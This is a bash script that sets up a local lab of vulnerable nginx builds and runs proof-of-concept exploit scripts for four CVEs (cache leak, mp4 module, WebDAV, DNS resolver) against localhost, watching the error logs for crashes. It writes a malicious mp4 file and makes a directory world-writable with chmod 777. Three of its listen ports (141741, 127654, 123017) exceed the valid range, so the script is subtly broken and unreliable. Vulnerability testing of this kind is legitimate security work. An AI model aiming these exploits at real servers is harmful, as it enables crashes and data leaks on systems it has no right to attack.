#!/usr/bin/env bash
set -euo pipefail
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
ver=1.29.6
prefix="$LAB/nginx-$ver"
src="$LAB/nginx-$ver-src"
if [ ! -x "$prefix/sbin/nginx" ]; then
  [ -d "$src" ] || { wget -q -O "$LAB/n.tar.gz" https://nginx.org/download/nginx-$ver.tar.gz && tar -xf "$LAB/n.tar.gz" -C "$LAB" && mv "$LAB/nginx-$ver" "$src"; }
  cd "$src"
  ./configure --prefix="$prefix" --with-pcre="$LAB/pcre-8.45" --with-http_dav_module
  make -j"$(nproc)"
  make install
fi

stop() { pkill -f "$LAB/nginx-" 2>/dev/null || true; pkill -f backend-7529.py 2>/dev/null || true; sleep 1; }

test_7529() {
  stop
  python3 "$LAB/backend-7529.py" &
  sleep 1
  "$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
  curl -sf http://127.0.0.1:17529/ >/dev/null
  curl -sf http://127.0.0.1:17529/ >/dev/null
  python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
}

test_41741() {
  stop
  "$LAB/nginx-1.23.1/sbin/nginx" -c "$LAB/conf/41741.conf"
  python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" http://127.0.0.1:141741/evil.mp4
}

test_27654() {
  stop
  mkdir -p /data/files 2>/dev/null || sudo mkdir -p /data/files
  chmod 777 /data/files 2>/dev/null || sudo chmod 777 /data/files
  rm -rf /data/files/*
  "$LAB/nginx-1.29.6/sbin/nginx" -c "$LAB/conf/27654.conf"
  python3 "$POCLAB/pocs/CVE-2026-27654/poc.py" http://127.0.0.1:127654
}

test_23017() {
  stop
  if [ "$(id -u)" -ne 0 ]; then echo "[-] skip: need root"; return 2; fi
  python3 -c "import scapy" 2>/dev/null || pip3 install -q scapy
  cat >"$LAB/conf/23017.conf" <<EOF
worker_processes 1;
error_log $LAB/23017-error.log info;
pid $LAB/23017.pid;
events { worker_connections 64; }
http {
    resolver 127.0.0.53 valid=30s ipv6=off;
    server {
        listen 123017;
        location / {
            set \$u "http://resolve.test/";
            proxy_pass \$u;
        }
    }
}
EOF
  pkill dnsmasq 2>/dev/null || true
  dnsmasq --keep-in-foreground --port=53 --listen-address=127.0.0.53 --no-hosts --no-resolv &
  dpid=$!
  sleep 1
  "$LAB/nginx-1.20.0/sbin/nginx" -c "$LAB/conf/23017.conf"
  timeout 20 python3 "$POCLAB/pocs/CVE-2021-23017/poc.py" -t 127.0.0.1 -r 127.0.0.53 &
  ppid=$!
  sleep 2
  curl -sf --max-time 5 http://127.0.0.1:123017/ >/dev/null || true
  wait $ppid || true
  kill $dpid 2>/dev/null || true
  grep -qE "signal 11|exited on signal|alert" "$LAB/23017-error.log" 2>/dev/null && return 0
  return 1
}

mkdir -p "$LAB/conf" "$LAB/www" "$LAB/cache"
echo "AAAA test content for cache leak CVE-2017-7529" >"$LAB/www/index.html"
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" --write "$LAB/www/evil.mp4" >/dev/null
cat >"$LAB/backend-7529.py" <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"AAAA test content for cache leak CVE-2017-7529\n")
    def log_message(self, *a): pass
HTTPServer(("127.0.0.1", 18081), H).serve_forever()
PY
cat >"$LAB/conf/7529.conf" <<EOF
worker_processes 1;
error_log $LAB/7529-error.log info;
pid $LAB/7529.pid;
events { worker_connections 64; }
http {
    proxy_cache_path $LAB/cache levels=1:2 keys_zone=c:10m;
    upstream b { server 127.0.0.1:18081; }
    server {
        listen 17529;
        location / {
            proxy_cache c;
            proxy_pass http://b;
        }
    }
}
EOF
cat >"$LAB/conf/41741.conf" <<EOF
worker_processes 1;
error_log $LAB/41741-error.log info;
pid $LAB/41741.pid;
events { worker_connections 64; }
http {
    server {
        listen 141741;
        location / { root $LAB/www; mp4; }
    }
}
EOF
cat >"$LAB/conf/27654.conf" <<EOF
worker_processes 1;
error_log $LAB/27654-error.log info;
pid $LAB/27654.pid;
events { worker_connections 64; }
http {
    server {
        listen 127654;
        client_max_body_size 1m;
        location /uploads/ {
            alias /data/files/;
            dav_methods PUT DELETE MKCOL COPY MOVE;
            create_full_put_path on;
        }
    }
}
EOF

declare -A R
for id in CVE-2017-7529 CVE-2022-41741 CVE-2026-27654 CVE-2021-23017; do
  echo "======== $id ========"
  case $id in
    CVE-2017-7529) test_7529 >"$LAB/$id.log" 2>&1; R[$id]=$? ;;
    CVE-2022-41741) test_41741 >"$LAB/$id.log" 2>&1; R[$id]=$? ;;
    CVE-2026-27654) test_27654 >"$LAB/$id.log" 2>&1; R[$id]=$? ;;
    CVE-2021-23017) test_23017 >"$LAB/$id.log" 2>&1; R[$id]=$? ;;
  esac
  tail -12 "$LAB/$id.log"
  echo "exit ${R[$id]}"
  echo
done
stop
echo "SUMMARY"
for id in CVE-2017-7529 CVE-2022-41741 CVE-2026-27654 CVE-2021-23017; do
  echo "$id exit ${R[$id]}"
done
